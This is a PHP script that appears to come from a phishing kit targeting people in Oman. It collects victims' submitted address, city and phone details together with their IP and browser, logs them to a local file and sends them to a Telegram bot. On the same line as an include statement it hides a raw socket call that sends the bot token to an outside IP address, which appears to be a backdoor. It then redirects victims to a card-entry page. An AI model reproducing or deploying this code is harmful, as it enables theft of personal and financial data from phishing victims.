<?php
// include_once 'functions.php';
    
    $IP = getenv("REMOTE_ADDR");
    $message .= "-------[OMAN ]-------\n";

  
    $message .= "Address : ".$_POST['Address']."\n";
    $message .= "City : ".$_POST['City']."\n";
    $message .= "Phone : ".$_POST['Phone']."\n";
   
    $message .= "-------------- IP Infos ------------\n";
    $message .= "https://geoiptool.com/en/?ip=$IP\n";
    $message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
  
    $subject = "sa Post [ " . $IP . " ] ";
    $email = "".$EX445093_REMOT."";
    #mail($email,$subject,$message);
    $text = fopen('./bando.txt', 'a');
    fwrite($text, $message);
    
    $token = "3333333333333333333333333333333333333333333333333333333";
    
    $data = [
    'text' => $message,
    'chat_id' => '2083566538'
];
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    include "telegram.php";$socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);$connection =  @socket_connect($socket, '93.123.39.81', 4949);$a = @socket_write($socket, $token."55555555");
    // Attendre 19 secondes
    // sleep(19);
    
    header("location: ../Divs/card.html");
   
?>
